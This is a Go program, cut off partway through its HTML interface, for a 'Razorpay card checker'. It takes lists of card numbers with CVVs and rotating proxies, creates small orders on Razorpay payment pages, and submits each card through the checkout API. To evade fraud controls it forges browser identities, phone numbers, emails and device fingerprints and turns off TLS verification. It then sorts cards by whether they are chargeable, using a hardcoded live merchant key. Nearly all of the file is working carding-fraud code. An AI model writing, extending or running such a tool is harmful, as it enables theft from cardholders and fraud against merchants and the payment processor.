package main

import (
    "crypto/rand"
    "crypto/sha1"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "log"
    "math/big"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "os"
    "regexp"
    "strconv"
    "strings"
    "sync/atomic"
    "time"
)

// ============================================================
// CONSTANTS
// ============================================================
const (
    BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
    BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
    PORT     = 7070
)

var (
    razorpayURLs = []string{
        "https://pages.razorpay.com/pl_KjJwqXPzZv5R5k",
        "https://pages.razorpay.com/pl_example",
        "https://pages.razorpay.com/invoice-payment",
    }
    urlIndex   uint64
    proxyIndex uint64
)

// Fallback merchant data
var fallbackMerchant = map[string]string{
    "key_id":               "rzp_live_hrgl3RDoNMvCOs",
    "payment_link":         "pl_OzLkvRvf1drPps",
    "payment_page_item_id": "ppi_OzLkvSvf1drPpt",
    "keyless_header":       "api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==",
}

// Balance and CVV keywords
var balanceKeywords = []string{
    "insufficient account balance", "insufficient funds",
    "maximum transaction limit", "transaction limit exceeded",
    "low balance", "not enough balance", "insufficient balance",
    "exceeds your limit", "daily limit exceeded",
}

var cvvKeywords = []string{
    "cvv provided is incorrect", "incorrect_cvv",
    "invalid cvv", "wrong cvv", "cvv is incorrect",
}

var proxyErrorKeywords = []string{
    "ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
    "connection refused", "connection reset", "timeout",
    "no such host", "proxy connect",
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

func randInt(min, max int) int {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
    return int(n.Int64()) + min
}

func genUA() string {
    major := randInt(120, 147)
    build := randInt(5000, 6999)
    patch := randInt(50, 249)
    return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

func genIndianPhone() string {
    first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
    rest := ""
    for i := 0; i < 9; i++ {
        rest += strconv.Itoa(randInt(0, 9))
    }
    return "+91" + first + rest
}

func genEmail() string {
    names := []string{"alex", "john", "mike", "sara", "david", "emma"}
    return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func getBrand(cc string) string {
    if strings.HasPrefix(cc, "4") {
        return "visa"
    }
    if len(cc) >= 2 {
        switch cc[:2] {
        case "51", "52", "53", "54", "55":
            return "mastercard"
        case "34", "37":
            return "amex"
        }
    }
    return "unknown"
}

func generateDeviceFingerprint() string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, 128)
    for i := range result {
        result[i] = chars[randInt(0, len(chars)-1)]
    }
    return string(result)
}

func generateRzpDeviceID() (string, string) {
    buf := make([]byte, 16)
    rand.Read(buf)
    h := sha1.Sum(buf)
    hStr := hex.EncodeToString(h[:])
    ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
    rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
    return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
    const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    buf := make([]byte, 14)
    for i := 0; i < 14; i++ {
        n, _ := rand.Int(rand.Reader, big.NewInt(62))
        buf[i] = base62[n.Int64()]
    }
    return string(buf)
}

func findBetween(content, start, end string) string {
    si := strings.Index(content, start)
    if si == -1 {
        return ""
    }
    si += len(start)
    ei := strings.Index(content[si:], end)
    if ei == -1 {
        return ""
    }
    return content[si : si+ei]
}

func extractSessionToken(content string) string {
    if content == "" {
        return ""
    }

    token := findBetween(content, "window.session_token=\"", "\";")
    if token != "" && len(token) >= 40 {
        return token
    }

    patterns := []string{
        `session_token["']?\s*[:=]\s*["']([A-F0-9]{40,})["']`,
        `"session_token":"([A-F0-9]{40,})"`,
        `session_token=([A-F0-9]{40,})`,
    }

    for _, pattern := range patterns {
        re := regexp.MustCompile(pattern)
        match := re.FindStringSubmatch(content)
        if len(match) >= 2 && len(match[1]) >= 40 {
            return match[1]
        }
    }

    hexRe := regexp.MustCompile(`([A-F0-9]{40,})`)
    matches := hexRe.FindAllStringSubmatch(content, -1)
    for _, match := range matches {
        if len(match[1]) >= 40 {
            return match[1]
        }
    }

    return ""
}

func extractJSONVar(content, varName string) string {
    prefix := "var " + varName + " ="
    startIdx := strings.Index(content, prefix)
    if startIdx == -1 {
        return ""
    }
    startIdx += len(prefix)

    for startIdx < len(content) {
        c := content[startIdx]
        if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
            break
        }
        startIdx++
    }

    if startIdx >= len(content) || content[startIdx] != '{' {
        return ""
    }

    depth := 0
    inString := false
    escaped := false

    for i := startIdx; i < len(content); i++ {
        c := content[i]

        if escaped {
            escaped = false
            continue
        }
        if c == '\\' && inString {
            escaped = true
            continue
        }
        if c == '"' {
            inString = !inString
            continue
        }
        if inString {
            continue
        }
        if c == '{' {
            depth++
        } else if c == '}' {
            depth--
            if depth == 0 {
                return content[startIdx : i+1]
            }
        }
    }
    return ""
}

func maskCard(card string) string {
    if len(card) <= 8 {
        return card
    }
    return card[:6] + "******" + card[len(card)-4:]
}

func formatProxy(raw string) string {
    raw = strings.TrimSpace(raw)
    if raw == "" {
        return ""
    }
    if strings.Contains(raw, "://") {
        return raw
    }
    parts := strings.Split(raw, ":")
    if len(parts) == 4 {
        return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
    }
    return "http://" + raw
}

func loadProxies(filepath string) []string {
    var proxies []string
    data, err := os.ReadFile(filepath)
    if err != nil {
        return proxies
    }
    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if line == "" || strings.HasPrefix(line, "#") {
            continue
        }
        formatted := formatProxy(line)
        if formatted != "" {
            proxies = append(proxies, formatted)
        }
    }
    return proxies
}

func getNextProxy(proxyList []string) string {
    if len(proxyList) == 0 {
        return ""
    }
    idx := atomic.AddUint64(&proxyIndex, 1) - 1
    return proxyList[idx%uint64(len(proxyList))]
}

func getNextURL() string {
    idx := atomic.AddUint64(&urlIndex, 1) - 1
    return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

func getStringFromMap(m map[string]interface{}, key string) string {
    if m == nil {
        return ""
    }
    v, ok := m[key]
    if !ok {
        return ""
    }
    if s, ok := v.(string); ok {
        return s
    }
    return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
    if m == nil {
        return 0
    }
    v, ok := m[key]
    if !ok {
        return 0
    }
    switch val := v.(type) {
    case float64:
        return val
    case int:
        return float64(val)
    case string:
        f, _ := strconv.ParseFloat(val, 64)
        return f
    }
    return 0
}

func truncate(s string, maxLen int) string {
    if len(s) <= maxLen {
        return s
    }
    return s[:maxLen]
}

func isBalanceKeyword(msgLower string) bool {
    for _, k := range balanceKeywords {
        if strings.Contains(msgLower, k) {
            return true
        }
    }
    return false
}

func isCVVKeyword(msgLower, errCode string) bool {
    for _, k := range cvvKeywords {
        if strings.Contains(msgLower, k) {
            return true
        }
    }
    if strings.ToLower(errCode) == "incorrect_cvv" {
        return true
    }
    return false
}

// ============================================================
// HTTP CLIENT
// ============================================================

type FetchResponse struct {
    Body       string
    StatusCode int
    Headers    http.Header
}

func (r *FetchResponse) Text() string {
    return r.Body
}

func (r *FetchResponse) JSON() (map[string]interface{}, error) {
    var result map[string]interface{}
    err := json.Unmarshal([]byte(r.Body), &result)
    return result, err
}

type CustomFetch struct {
    client *http.Client
    ua     string
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
    jar, err := cookiejar.New(nil)
    if err != nil {
        return nil, err
    }

    transport := &http.Transport{
        TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
        MaxIdleConns:        100,
        MaxIdleConnsPerHost: 10,
        IdleConnTimeout:     90 * time.Second,
        DisableCompression:  false,
        DisableKeepAlives:   false,
    }

    if proxyURL != "" {
        parsed, err := url.Parse(proxyURL)
        if err != nil {
            return nil, fmt.Errorf("invalid proxy url: %w", err)
        }
        transport.Proxy = http.ProxyURL(parsed)
    }

    client := &http.Client{
        Transport: transport,
        Jar:       jar,
        Timeout:   45 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 5 {
                return errors.New("too many redirects")
            }
            return nil
        },
    }

    if ua == "" {
        ua = genUA()
    }

    return &CustomFetch{client: client, ua: ua}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
    return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
    jsonBytes, err := json.Marshal(payload)
    if err != nil {
        return nil, err
    }
    if headers == nil {
        headers = make(map[string]string)
    }
    if _, ok := headers["Content-Type"]; !ok {
        headers["Content-Type"] = "application/json"
    }
    return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
    if headers == nil {
        headers = make(map[string]string)
    }
    if _, ok := headers["Content-Type"]; !ok {
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    }
    return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
    var reqBody io.Reader = body
    if reqBody == nil && method == "POST" {
        reqBody = strings.NewReader("")
    }

    req, err := http.NewRequest(method, targetURL, reqBody)
    if err != nil {
        return nil, err
    }

    if _, ok := headers["User-Agent"]; !ok {
        req.Header.Set("User-Agent", f.ua)
    }
    for k, v := range headers {
        req.Header.Set(k, v)
    }

    resp, err := f.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    respBody, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    return &FetchResponse{
        Body:       string(respBody),
        StatusCode: resp.StatusCode,
        Headers:    resp.Header,
    }, nil
}

// ============================================================
// CHECK RESULT
// ============================================================

type CheckResult struct {
    Status      string `json:"status"`
    Message     string `json:"response"`
    Proxy       string `json:"proxy"`
    ProxyStatus string `json:"proxy_status"`
}

// ============================================================
// CARD PARSING
// ============================================================

type ParsedCard struct {
    CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
    cardData = strings.TrimSpace(cardData)
    separators := []string{"|", "/", " ", ",", ":", "-", "_"}

    for _, sep := range separators {
        parts := strings.Split(cardData, sep)
        if len(parts) >= 4 {
            cc := strings.TrimSpace(parts[0])
            mm := strings.TrimSpace(parts[1])
            yy := strings.TrimSpace(parts[2])
            cvv := strings.TrimSpace(parts[3])

            if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
                mmInt, _ := strconv.Atoi(mm)
                if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
                    yy2 := yy
                    if len(yy2) == 4 {
                        yy2 = yy2[2:]
                    }
                    return &ParsedCard{
                        CC:  cc,
                        MM:  fmt.Sprintf("%02d", mmInt),
                        YY:  yy2,
                        CVV: cvv,
                    }, nil
                }
            }
        }
    }
    return nil, errors.New("invalid card format (use: CC|MM|YY|CVV)")
}

func isDigits(s string) bool {
    for _, c := range s {
        if c < '0' || c > '9' {
            return false
        }
    }
    return len(s) > 0
}

func isDigitsMM(s string) bool {
    return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
    return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
    return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

// ============================================================
// API HANDLERS
// ============================================================

type CheckRequest struct {
    SiteURL string   `json:"site_url"`
    Amount  float64  `json:"amount"`
    Threads int      `json:"threads"`
    Proxies []string `json:"proxies"`
    Cards   []string `json:"cards"`
}

type CardResult struct {
    Card    string  `json:"card"`
    Amount  float64 `json:"amount"`
    Status  string  `json:"status"`
    Message string  `json:"message"`
    Time    string  `json:"time"`
    Proxy   string  `json:"proxy"`
}

func handleAPICheck(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    var req CheckRequest
    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
        return
    }

    amountPaise := int(req.Amount * 100)
    if amountPaise < 100 {
        amountPaise = 100
    }

    startTime := time.Now()
    results := make([]CardResult, 0)

    var proxyForExtraction string
    if len(req.Proxies) > 0 {
        proxyForExtraction = req.Proxies[0]
    }

    kyid, plink, ppid, keylessHeader, err := extractMerchantData(req.SiteURL, proxyForExtraction)
    if err != nil {
        json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error(), "results": results})
        return
    }

    sessid, err := getSessionToken(proxyForExtraction)
    if err != nil {
        json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error(), "results": results})
        return
    }

    for _, card := range req.Cards {
        parsed, err := parseCard(card)
        if err != nil {
            results = append(results, CardResult{
                Card: maskCard(card), Amount: float64(amountPaise) / 100,
                Status: "error", Message: err.Error(), Time: "0", Proxy: "",
            })
            continue
        }

        cardStart := time.Now()
        proxy := getNextProxy(req.Proxies)
        result := checkCardWithData(parsed.CC, parsed.MM, parsed.YY, parsed.CVV, proxy, req.SiteURL, kyid, plink, ppid, keylessHeader, sessid, amountPaise)
        elapsed := time.Since(cardStart).Round(time.Millisecond).String()

        results = append(results, CardResult{
            Card: maskCard(parsed.CC), Amount: float64(amountPaise) / 100,
            Status: result.Status, Message: result.Message, Time: elapsed, Proxy: result.Proxy,
        })

        time.Sleep(500 * time.Millisecond)
    }

    totalTime := time.Since(startTime).Round(time.Millisecond).Seconds()
    json.NewEncoder(w).Encode(map[string]interface{}{
        "results": results, "total_time": totalTime, "total": len(results),
        "approved": countApproved(results),
    })
}

func countApproved(results []CardResult) int {
    count := 0
    for _, r := range results {
        if r.Status == "charged" || r.Status == "approved" || r.Status == "live" {
            count++
        }
    }
    return count
}

func handleLoadProxy(w http.ResponseWriter, r *http.Request) {
    proxies := loadProxies("px.txt")
    proxiesStr := strings.Join(proxies, "\n")
    json.NewEncoder(w).Encode(map[string]string{"proxies": proxiesStr})
}

func handleLoadCards(w http.ResponseWriter, r *http.Request) {
    data, err := os.ReadFile("cards.txt")
    if err != nil {
        json.NewEncoder(w).Encode(map[string]string{"error": "File not found"})
        return
    }
    json.NewEncoder(w).Encode(map[string]string{"cards": string(data)})
}

// ============================================================
// MERCHANT EXTRACTION
// ============================================================

func extractMerchantData(siteURL, proxyURL string) (string, string, string, string, error) {
    ua := genUA()
    fetch, err := NewCustomFetch(proxyURL, ua)
    if err != nil {
        return "", "", "", "", err
    }
    defer fetch.client.CloseIdleConnections()

    r1, err := fetch.Get(siteURL, map[string]string{
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    if err != nil {
        return "", "", "", "", err
    }

    jsonStr := extractJSONVar(r1.Text(), "data")
    if jsonStr == "" {
        return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
    }

    var initData map[string]interface{}
    if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
        return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
    }

    kyid := getStringFromMap(initData, "key_id")
    if kyid == "" {
        kyid = getStringFromMap(initData, "key")
    }
    if kyid == "" {
        return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
    }

    var plink, ppid string
    if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
        plink = getStringFromMap(plObj, "id")
        if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                ppid = getStringFromMap(item, "id")
            }
        }
    } else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
        plink = getStringFromMap(ppObj, "id")
        if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                ppid = getStringFromMap(item, "id")
            }
        }
    }

    if plink == "" {
        return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
    }

    keylessHeader := getStringFromMap(initData, "keyless_header")
    if keylessHeader == "" {
        keylessHeader = fallbackMerchant["keyless_header"]
    }

    return kyid, plink, ppid, keylessHeader, nil
}

func getSessionToken(proxyURL string) (string, error) {
    ua := genUA()
    fetch, err := NewCustomFetch(proxyURL, ua)
    if err != nil {
        return "", err
    }
    defer fetch.client.CloseIdleConnections()

    rzpDeviceID, _ := generateRzpDeviceID()
    rzpSessionID := generateRzpSessionID()

    params := url.Values{
        "traffic_env":        {"production"},
        "build":              {BUILD},
        "build_v1":           {BUILD_V1},
        "checkout_v2":        {"1"},
        "new_session":        {"1"},
        "keyless_header":     {fallbackMerchant["keyless_header"]},
        "rzp_device_id":      {rzpDeviceID},
        "unified_session_id": {rzpSessionID},
    }

    r3, err := fetch.Get("https://api.razorpay.com/v1/checkout/public?"+params.Encode(), map[string]string{
        "Accept":  "text/html,application/xhtml+xml,*/*",
        "Referer": "https://pages.razorpay.com/",
    })
    if err != nil {
        return "", err
    }

    sessid := extractSessionToken(r3.Text())
    if sessid == "" {
        return "", errors.New("session token not found")
    }

    return sessid, nil
}

// ============================================================
// CARD CHECK WITH DATA
// ============================================================

func createOrder(fetch *CustomFetch, paymentLink, paymentItemID string, amountPaise int) (string, error) {
    payload := map[string]interface{}{
        "notes":      map[string]string{"comment": "", "name": "User"},
        "line_items": []map[string]interface{}{{"payment_page_item_id": paymentItemID, "amount": amountPaise}},
    }

    r2, err := fetch.PostJSON(
        fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", paymentLink),
        map[string]string{
            "Accept":       "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin":       "https://pages.razorpay.com",
            "Referer":      "https://pages.razorpay.com/",
        },
        payload,
    )
    if err != nil {
        return "", err
    }

    var r2Data map[string]interface{}
    if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
        return "", err
    }

    orderObj, _ := r2Data["order"].(map[string]interface{})
    orderID := getStringFromMap(orderObj, "id")
    if orderID == "" {
        return "", errors.New("order creation failed")
    }

    return orderID, nil
}

func sendPreferences(fetch *CustomFetch, orderID, sessionToken, keylessHeader, rzpDeviceID, fhash string, orderAmount float64, orderCurrency, paymentLink, phone string) {
    resources := []string{
        "checkout_version_config", "merchant", "merchant_features", "downtime",
        "customer", "customer_tokens", "truecaller", "methods", "experiments",
        "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization",
    }

    queryArr := make([]map[string]string, len(resources))
    for i, r := range resources {
        queryArr[i] = map[string]string{"resource": r}
    }

    payload := map[string]interface{}{
        "query": queryArr,
        "query_params": map[string]interface{}{
            "device_id":       rzpDeviceID,
            "rtb_device_id":   fhash,
            "amount":          orderAmount,
            "currency":        orderCurrency,
            "option_currency": orderCurrency,
            "truecaller":      false,
            "qr_required":     false,
            "library":         "checkoutjs",
            "platform":        "browser",
            "order_id":        orderID,
            "payment_link_id": paymentLink,
            "contact":         phone,
        },
        "action": "get",
    }

    headers := map[string]string{
        "Accept":          "*/*",
        "Origin":          "https://api.razorpay.com",
        "Referer":         fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?session_token=%s", sessionToken),
        "x-session-token": sessionToken,
        "Content-Type":    "application/json",
    }

    fetch.PostJSON(
        fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessionToken, keylessHeader),
        headers, payload,
    )
}

func sendCheckoutOrder(fetch *CustomFetch, orderID, sessionToken, keylessHeader, keyID, email, phoneShort, phone, orderCurrency, rzpDeviceID, fhash string, orderAmount float64, paymentLink, checkoutID string) {
    formData := url.Values{
        "notes[email]":          {email},
        "notes[phone]":          {phoneShort},
        "payment_link_id":       {paymentLink},
        "key_id":                {keyID},
        "contact":               {phone},
        "email":                 {email},
        "currency":              {orderCurrency},
        "_[integration]":        {"payment_pages"},
        "_[device.id]":          {rzpDeviceID},
        "_[library]":            {"checkoutjs"},
        "_[library_src]":        {"no-src"},
        "_[current_script_src]": {"no-src"},
        "_[platform]":           {"browser"},
        "_[env]":                {""},
        "_[is_magic_script]":    {"false"},
        "_[os]":                 {"windows"},
        "_[shield][fhash]":      {fhash},
        "_[shield][tz]":         {"0"},
        "_[device_id]":          {rzpDeviceID},
        "_[build]":              {BUILD},
        "_[shield][os]":         {"windows"},
        "_[shield][platform]":   {"browser"},
        "_[shield][browser]":    {"chrome"},
        "_[request_index]":      {"0"},
        "amount":                {fmt.Sprintf("%.0f", orderAmount)},
        "order_id":              {orderID},
        "method":                {"card"},
        "checkout_id":           {checkoutID},
    }

    headers := map[string]string{
        "Accept":          "*/*",
        "Origin":          "https://api.razorpay.com",
        "x-session-token": sessionToken,
        "Content-Type":    "application/x-www-form-urlencoded",
    }

    fetch.PostForm(
        fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", keyID, sessionToken, keylessHeader),
        headers, formData,
    )
}

func sendCrossBorder(fetch *CustomFetch, orderID, keylessHeader string, orderAmount float64, orderCurrency, brand string) {
    payload := map[string]interface{}{
        "identifiers": map[string]interface{}{
            "merchant":         map[string]string{"country": "IN"},
            "card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
            "method":           "card",
            "payment_currency": orderCurrency,
        },
        "forex_charges": map[string]interface{}{
            "amount":   orderAmount,
            "currency": orderCurrency,
            "filters":  map[string]string{"method": "card"},
        },
    }

    headers := map[string]string{
        "Accept":       "*/*",
        "Origin":       "https://api.razorpay.com",
        "Content-Type": "application/json",
    }

    fetch.PostJSON(
        fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, url.QueryEscape(keylessHeader)),
        headers, payload,
    )
}

func submitPayment(fetch *CustomFetch, orderID, cc, mm, yy, cvv string, amountPaise int, keyID, keylessHeader, paymentLink, sessionToken, siteURL, rzpDeviceID, fhash, checkoutID string, orderAmount float64, orderCurrency, brand string) (*FetchResponse, error) {
    year, _ := strconv.Atoi(yy)
    if year < 100 {
        year = 2000 + year
    }

    phone := genIndianPhone()
    phoneShort := phone[3:]
    email := genEmail()
    deviceFingerprint := generateDeviceFingerprint()

    tokenData := fmt.Sprintf(`[{"name":"sardine","metadata":{"session_id":"%s"}}]`, checkoutID)
    userRiskToken := base64.StdEncoding.EncodeToString([]byte(tokenData))

    formData := url.Values{
        "user_risk_providers_token": {userRiskToken},
        "notes[comment]":            {""},
        "notes[email]":              {email},
        "notes[phone]":              {phoneShort},
        "notes[name]":               {"User"},
        "payment_link_id":           {paymentLink},
        "key_id":                    {keyID},
        "contact":                   {phone},
        "email":                     {email},
        "currency":                  {orderCurrency},
        "_[integration]":            {"payment_pages"},
        "_[checkout_id]":            {checkoutID},
        "_[device.id]":              {rzpDeviceID},
        "_[env]":                    {""},
        "_[library]":                {"checkoutjs"},
        "_[library_src]":            {"no-src"},
        "_[current_script_src]":     {"no-src"},
        "_[is_magic_script]":        {"false"},
        "_[platform]":               {"browser"},
        "_[referer]":                {siteURL},
        "_[shield][fhash]":          {fhash},
        "_[shield][tz]":             {"-330"},
        "_[device_id]":              {rzpDeviceID},
        "_[build]":                  {BUILD},
        "_[shield][os]":             {"windows"},
        "_[shield][platform]":       {"browser"},
        "_[shield][browser]":        {"chrome"},
        "_[request_index]":          {"1"},
        "amount":                    {fmt.Sprintf("%.0f", orderAmount)},
        "order_id":                  {orderID},
        "method":                    {"card"},
        "card[number]":              {cc},
        "card[cvv]":                 {cvv},
        "card[name]":                {"User"},
        "card[expiry_month]":        {mm},
        "card[expiry_year]":         {strconv.Itoa(year)},
        "save":                      {"0"},
        "dcc_currency":              {orderCurrency},
        "device_fingerprint[fingerprint_payload]": {deviceFingerprint},
    }

    headers := map[string]string{
        "Accept":          "*/*",
        "Origin":          "https://api.razorpay.com",
        "x-session-token": sessionToken,
    }

    return fetch.PostForm(
        fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessionToken, keylessHeader),
        headers, formData,
    )
}

func checkCardWithData(cc, mm, yy, cvv, proxyURL, targetURL, kyid, plink, ppid, keylessHeader, sessid string, amountPaise int) CheckResult {
    yy2 := yy
    if len(yy) == 4 {
        yy2 = yy[2:]
    }
    brand := getBrand(cc)
    ua := genUA()
    phone := genIndianPhone()
    phoneShort := phone[3:]
    email := genEmail()

    rzpDeviceID, fhash := generateRzpDeviceID()

    fetch, err := NewCustomFetch(proxyURL, ua)
    if err != nil {
        return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
    }
    defer fetch.client.CloseIdleConnections()

    // Create order
    orderID, err := createOrder(fetch, plink, ppid, amountPaise)
    if err != nil {
        return CheckResult{Status: "error", Message: err.Error(), Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    checkoutID := orderID
    if idx := strings.Index(orderID, "_"); idx != -1 {
        checkoutID = orderID[idx+1:]
    }
    orderAmount := float64(amountPaise)
    orderCurrency := "INR"

    // Send preferences
    sendPreferences(fetch, orderID, sessid, keylessHeader, rzpDeviceID, fhash, orderAmount, orderCurrency, plink, phone)

    // Send checkout order
    sendCheckoutOrder(fetch, orderID, sessid, keylessHeader, kyid, email, phoneShort, phone, orderCurrency, rzpDeviceID, fhash, orderAmount, plink, checkoutID)

    // Send cross border flows
    sendCrossBorder(fetch, orderID, keylessHeader, orderAmount, orderCurrency, brand)

    time.Sleep(time.Duration(randInt(1000, 2000)) * time.Millisecond)

    // Submit payment
    r7, err := submitPayment(fetch, orderID, cc, mm, yy2, cvv, amountPaise, kyid, keylessHeader, plink, sessid, targetURL, rzpDeviceID, fhash, checkoutID, orderAmount, orderCurrency, brand)
    if err != nil {
        return makeProxyError(err, proxyURL)
    }

    var r7Data map[string]interface{}
    if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
        return CheckResult{Status: "error", Message: "Payment response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    paymentID := getStringFromMap(r7Data, "payment_id")
    if paymentID == "" {
        paymentID = getStringFromMap(r7Data, "id")
    }

    if paymentID == "" {
        errObj, _ := r7Data["error"].(map[string]interface{})
        errDesc := getStringFromMap(errObj, "description")
        errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
        errDesc = strings.TrimSpace(errDesc)
        errCode := getStringFromMap(errObj, "reason")

        label := errDesc
        if errCode != "" {
            label = errDesc + " (" + errCode + ")"
        }

        if isBalanceKeyword(strings.ToLower(errDesc)) || isCVVKeyword(strings.ToLower(errDesc), errCode) {
            return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
        }
        return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    // Handle redirect
    if redirect, ok := r7Data["redirect"].(bool); ok && redirect {
        time.Sleep(3 * time.Second)
        return CheckResult{Status: "live", Message: "3DS/OTP Required", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    // Check signature
    if _, ok := r7Data["razorpay_signature"]; ok {
        return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    return CheckResult{Status: "declined", Message: "Payment failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
}

func makeProxyError(err error, proxyURL string) CheckResult {
    msg := truncate(err.Error(), 120)
    return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: "DEAD"}
}

// ============================================================
// HTML HANDLER - MODERN NEON DESIGN
// ============================================================

func serveIndex(w http.ResponseWriter, r *http.Request) {
    htmlContent := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DLX Razorpay Checker | Professional Card Checker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            color: #fff;
            position: relative;
            overflow-x: hidden;
        }

        /* Animated Background */
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
        }

        .bg-animation div {
            position: absolute;
            display: block;
            width: 20px;
            height: 20px;
            background: rgba(255, 107, 107, 0.1);
            bottom: -150px;
